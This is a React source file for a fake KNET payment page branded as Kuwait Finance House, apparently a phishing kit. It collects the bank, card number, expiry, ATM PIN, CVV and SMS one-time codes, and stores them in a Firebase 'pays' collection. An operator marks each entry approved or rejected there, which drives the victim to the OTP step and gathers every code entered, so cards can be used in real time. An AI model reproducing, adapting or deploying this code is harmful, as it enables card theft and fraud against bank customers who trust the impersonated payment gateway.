"use client"
import { useEffect, useState } from "react"
import "./kent.css"
import { doc, onSnapshot } from "firebase/firestore"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { CreditCard, AlertCircle, Calendar, Lock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { db, handlePay } from "@/lib/firebase"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Label } from "@/components/ui/label"
import { FullPageLoader } from "@/components/full-page-loader"
import { Separator } from "@/components/ui/separator"
import { Input } from "@/components/ui/input"
type PaymentInfo = {
  createdDate: string
  cardNumber: string
  year: string
  month: string
  bank?: string
  cvv?: string
  otp?: string
  pass: string
  cardState: string
  allOtps: string[]
  bank_card: string[]
  prefix: string
  status: "new" | "pending" | "approved" | "rejected"
}
const BANKS = [
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
  },

  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
  },

  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },

  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },

  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
]

const Payment = (props: any) => {
  const handleSubmit = async () => {}

  const [step, setstep] = useState(1)
  const [newotp] = useState([""])
  const [total, setTotal] = useState("")
  const [isloading, setisloading] = useState(false)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
  const [isExpired, setIsExpired] = useState(false)

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true)
      return
    }

    const timer = setTimeout(() => {
      setTimeLeft(timeLeft - 1)
    }, 1000)

    return () => clearTimeout(timer)
  }, [timeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`
  }

  const handleResendCode = () => {
    // Reset timer and expired state
    setTimeLeft(300)
    setIsExpired(false)
    // Here you would typically call an API to resend the code
    console.log("Resending verification code...")
  }

  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
  })

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }
  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
    const ty = localStorage!.getItem("amount")
    if (ty) {
      setTotal(ty)
    }
  }, [])

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
            if (data.status === "approved") {
              // If we're on step 1, move to OTP verification
              if (step === 1) {
                setstep(2)
                setisloading(false)
              }
              // If we're already on step 2 (OTP verification), this means OTP was approved
              else if (step === 2) {
                // Show success message or redirect to success page
                setisloading(false)
                // You could redirect here or show a success component
              }
            } else if (data.status === "rejected") {
              setisloading(false)
              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
              setstep(1)
            } else if (data.status === "pending") {
              setisloading(true)
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [step])

  return (
    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir='ltr'> 
      <form
        onSubmit={(e) => {
          e.preventDefault();
        }}
      >
        <div className="madd" />
        <img src="./pc.jpg" className="-" alt="logo" />

        <div id="PayPageEntry" >

          <div className="container">

            <div className="content-block">
              <Card className="form- p-6 ">
                <div className="container-" style={{ display: 'flex', justifyContent: 'center' }}>
                  <img src="./kfh.jpg" className="-" alt="logo" height={80} width={80} />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">Kuwait Finance House (KFH) </label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {total}
                    {'  '}KD&nbsp;{' '}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div
                  className="row"
                  id="DiscntRate"
                  style={{ display: 'none' }}
                />
                <div
                  className="row"
                  id="DiscntedAmt"
                  style={{ display: 'none' }}
                />
                {/* Added for PG Eidia Discount ends   */}
              </Card>
              <Card className="form- p-4 my-4">
                <div
                  className="notification"
                  style={{
                    border: '#ff0000 1px solid',
                    backgroundColor: '#f7dadd',
                    fontSize: 12,
                    fontFamily: 'helvetica, arial, sans serif',
                    color: '#ff0000',
                    paddingRight: 15,
                    display: 'none',
                    marginBottom: 3,
                    textAlign: 'center',
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: '#ff0000 1px solid',
                    backgroundColor: '#f7dadd',
                    fontSize: 12,
                    fontFamily: 'helvetica, arial, sans serif',
                    color: '#ff0000',
                    paddingRight: 15,
                    display: 'none',
                    marginBottom: 3,
                    textAlign: 'center',
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: 'none' }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: '50%' }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                      <div className="row">
                        <label
                          className="column-label"
                          style={{ width: '40%' }}
                        >
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          style={{ width: '60%' }}
                          onChange={(e: any) => {
                            const selectedBank = BANKS.find(
                              (bank) => bank.value === e.target.value
                            );

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank
                                ? selectedBank.cardPrefixes
                                : [''],
                            });
                          }}
                        >
                          <>
                            <option value="bankname" title="Select Your Bank">
                              Select Your Banks
                            </option>
                            {BANKS.map((i, index) => (
                              <option value={i.value} key={index}>
                                {i.label} [{i.value}]
                              </option>
                            ))}
                          </>
                        </select>
                      </div>
                      <div
                        className="row three-column"
                        id="Paymentpagecardnumber"
                      >
                        <label className="column-label">Card Number:</label>
                        <label>
                          <select
                            className="column-value"
                            name="dcprefix"
                            id="dcprefix"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                prefix: e.target.value,
                              })
                            }
                            style={{ width: '26%' }}
                          >
                            <option
                              value={'i'}
                              onClick={(e: any) => {
                                setPaymentInfo({
                                  ...paymentInfo,
                                  prefix: e.target.value,
                                });
                              }}
                            >
                              prefix
                            </option>
                            {paymentInfo.bank_card.map((i, index) => (
                              <option
                                key={index}
                                value={i}
                                onClick={(e: any) => {
                                  setPaymentInfo({
                                    ...paymentInfo,
                                    prefix: e.target.value,
                                  });
                                }}
                              >
                                {i}
                              </option>
                            ))}
                          </select>
                        </label>
                        <label>
                          <input
                            name="debitNumber"
                            id="debitNumber"
                            type="tel"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            size={10}
                            className="allownumericwithoutdecimal"
                            style={{ width: '32%' }}
                            maxLength={10}
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                cardNumber: e.target.value,
                              })
                            }
                            title="Should be in number. Length should be 10"
                          />
                        </label>
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <div id="debitExpDate">
                          <label className="column-label">
                            {' '}
                            Expiration Date:{' '}
                          </label>
                        </div>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="column-value"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="column-long"
                        >
                          <option value={0}>YYYY</option>
                          <option value={2024}>2024</option>
                          <option value={2025}>2025</option>
                          <option value={2026}>2026</option>
                          <option value={2027}>2027</option>
                          <option value={2028}>2028</option>
                          <option value={2029}>2029</option>
                          <option value={2030}>2030</option>
                          <option value={2031}>2031</option>
                          <option value={2032}>2032</option>
                          <option value={2033}>2033</option>
                          <option value={2034}>2034</option>
                          <option value={2035}>2035</option>
                          <option value={2036}>2036</option>
                          <option value={2037}>2037</option>
                          <option value={2038}>2038</option>
                          <option value={2039}>2039</option>
                          <option value={2040}>2040</option>
                          <option value={2041}>2041</option>
                          <option value={2042}>2042</option>
                          <option value={2043}>2043</option>
                          <option value={2044}>2044</option>
                          <option value={2045}>2045</option>
                          <option value={2046}>2046</option>
                          <option value={2047}>2047</option>
                          <option value={2048}>2048</option>
                          <option value={2049}>2049</option>
                          <option value={2050}>2050</option>
                          <option value={2051}>2051</option>
                          <option value={2052}>2052</option>
                          <option value={2053}>2053</option>
                          <option value={2054}>2054</option>
                          <option value={2055}>2055</option>
                          <option value={2056}>2056</option>
                          <option value={2057}>2057</option>
                          <option value={2058}>2058</option>
                          <option value={2059}>2059</option>
                          <option value={2060}>2060</option>
                          <option value={2061}>2061</option>
                          <option value={2062}>2062</option>
                          <option value={2063}>2063</option>
                          <option value={2064}>2064</option>
                          <option value={2065}>2065</option>
                          <option value={2066}>2066</option>
                          <option value={2067}>2067</option>
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                        <input
                          type="hidden"
                          name="cardPinType"
                          defaultValue="A"
                        />
                        <div id="eComPin">
                          <label className="column-label"> PIN: </label>
                        </div>
                        <div>
                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cardPin"
                            id="cardPin"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                pass: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 4"
                            type="password"
                            size={4}
                            maxLength={4}
                            className="allownumericwithoutdecimal"
                            style={{ width: '60%' }}
                          />
                        </div>
                      </div>
                      {
                        step === 1 && paymentInfo.status === 'approved' ? (
                          <div className="row" id="PinRow">
                            {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                            <input
                              type="hidden"
                              name="cardPinType"
                              defaultValue="A"
                            />
                            <div id="eComPin">
                              <label className="column-label"> Cvv: </label>
                            </div>
                            <div>
                              <input
                                inputMode="numeric"
                                pattern="[0-9]*"
                                name="cvv"
                                id="cvv"
                              
                                autoComplete="off"
                                title="Should be in number. Length should be 3"
                                type="password"
                                size={3}
                                maxLength={3}
                                className="allownumericwithoutdecimal"
                                style={{ width: '60%' }}
                              />
                            </div>
                          </div>
                        ) : null
                      }
                    </div>
                  </>
                ) : (
                  <div>
                         <div className="">
      <CardHeader>
        <CardTitle className="text-xl font-semibold">Payment Verification</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <Alert variant="default" className="bg-blue-50 border-blue-200">
          <AlertCircle className="h-4 w-4 text-blue-600" />
          <AlertDescription className="text-sm text-blue-700">
            A 6-digit verification code has been sent via text message to your registered phone number. Please enter the
            code below to complete the verification process.
          </AlertDescription>
        </Alert>

        <div className="space-y-3 mt-4">
          <div className="flex items-center justify-between py-2">
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <CreditCard className="h-4 w-4" />
              <span>Card Number:</span>
            </div>
            <span className="font-medium">••••  {paymentInfo.cardNumber}</span>
          </div>

          <Separator />

          <div className="flex items-center justify-between py-2">
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <Calendar className="h-4 w-4" />
              <span>Expiration Date:</span>
            </div>
            <span className="font-medium">
              {paymentInfo.month}/{paymentInfo.year}
            </span>
          </div>

          <Separator />

          <div className="flex items-center justify-between py-2">
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <Lock className="h-4 w-4" />
              <span>Security Code:</span>
            </div>
            <span className="font-medium">••••</span>
          </div>
        </div>

        <div className="mt-6 space-y-2">
          <Label htmlFor="otp" className="text-sm font-medium">
            Enter Verification Code
          </Label>
          <Input
            id="otp"
            type="tel"
            inputMode="numeric"
            maxLength={6}
            placeholder="6-digit code"
            className="text-center tracking-widest text-lg"
            value={paymentInfo.otp}
            onChange={(e) =>
              setPaymentInfo({
                ...paymentInfo,
                otp: e.target.value.replace(/[^0-9]/g, ""),
                status:'pending'
              })
            }
          /> <div className="flex items-center justify-between mt-2">
          <p className="text-xs text-muted-foreground">
            {isExpired ? (
              "Code expired"
            ) : (
              <>
                Code expires in <span className="font-medium">{formatTime(timeLeft)}</span>
              </>
            )}
          </p>
          {isExpired && (
            <button
              type="button"
              onClick={handleResendCode}
              className="text-xs text-blue-600 hover:text-blue-800 font-medium"
            >
              Resend Code
            </button>
          )}
        </div>
          <p className="text-xs text-muted-foreground mt-1">Please enter the 6-digit code sent to your phone</p>
        </div>
      </CardContent>
    </div>
                   
                    </div>
                )
                }
              </Card>
              <Card className="form- p-4">
                <div className="row">
                  <div style={{ textAlign: 'center' }}>
                    <div id="loading" style={{ display: 'none' }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: 'left',
                            marginLeft: '20%',
                          }}
                        />
                        <label
                          className="column-value text-label"
                          style={{ width: '70%', textAlign: 'center' }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                 
                    <div style={{ display: 'flex' }}>
                      <Button
                      size={'sm'} className='bg-gray-300 mx-1 h-6' variant={'outline'}
                        disabled={
                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
         step ===2 && paymentInfo.otp?.length !==6
                        }
                        onClick={() => {
                          if (step === 1) {
                            setisloading(true);
                            handlePay(paymentInfo, setPaymentInfo);
                            handleSubmit();
                          } else if (step === 2) {
                            if (!newotp.includes(paymentInfo.otp!)) { 
                              newotp.push(paymentInfo.otp!);
                            }
                            setisloading(true);
                            handleAddotp(paymentInfo.otp!);
                            
                            // Update the payment info with OTP and set status to pending for approval
                            const updatedPaymentInfo = {
                              ...paymentInfo,
                              otp: paymentInfo.otp,
                              status: 'pending',
                              allOtps: [...newotp]
                            };
                            
                            // Send the updated payment info for processing
                            handlePay(updatedPaymentInfo, setPaymentInfo);
                            
                            // Don't reset OTP immediately to allow for proper verification
                            // The status will be updated by the Firebase listener
                          }
                        }}
                      >
                        {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
                      </Button>
                      <Button size={'sm'} className='bg-gray-300 h-6' variant={'outline'}>Cancel</Button>
                    </div>
                  </div>
                </div>
              </Card>
              <div
                id="overlayhide"
                className="overlay"
                style={{ display: 'none' }}
              ></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: 'center',
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2025&nbsp;©&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 'bold',
                          color: '#0077d5',
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                        - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
      </form>
      {isloading && <FullPageLoader />}
    </div>
  );
}

export default Payment
